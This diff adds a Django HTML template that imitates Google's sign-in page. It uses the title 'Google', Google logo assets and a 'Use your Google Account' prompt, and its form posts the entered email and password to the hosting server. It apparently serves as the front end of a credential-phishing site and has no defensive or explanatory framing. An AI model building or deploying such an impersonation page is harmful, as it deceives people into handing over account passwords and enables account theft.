@@ -1,0 +1,36 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="shortcut icon" type="image/x-icon" href="{% static 'google/gicon.svg' %}" />
+  <title>Google</title>
+  <link rel="stylesheet" href="{% static 'google/style.css' %}">
+  <style>
+
+</style>
+</head>
+<body>
+      <div class="box">
+        <div class="image">
+          <img class="img" src="{% static 'google/google.svg' %}" width="75px" alt="">
+        </div>
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+        <form action="" method="post">
+        {% csrf_token %}
+          <div class="inputBox">
+            <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
+            <label>Username</label>
+          </div>
+          <div class="inputBox">
+            <input type="password" name="password" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Passward</label>
+          </div>
+          <input type="submit" name="sign-in" value="Sign In">
+        </form>
+      </div>
+</body>
+</html>
